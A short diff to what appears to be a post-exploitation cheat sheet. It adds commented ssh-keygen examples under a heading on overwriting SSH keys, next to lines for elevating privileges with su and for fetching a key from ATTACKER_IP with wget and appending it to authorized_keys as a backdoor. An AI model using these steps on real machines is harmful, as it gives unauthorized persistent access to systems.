@@ -100,6 +100,10 @@ su root2      #Elevate Privs with su
 
 
 #Overwriting SSH id_rsa/authorized keys
+#ssh-keygen -t rsa             #Create SSH RSA key pair
+#ssh-keygen -b 2048 -t rsa     #Use -b flag to specify key length
+#ssh-keygen -t rsa -b 4096 -C "your_email@example.com"  #Use -C flag to specify email 
+#ssh-keygen -t ed25519 -C "your_email@example.com"    #Sampe using command using Ed25519 algorithm, required formore recent systems
 #echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys    #Add public key to authorized keys
 
 
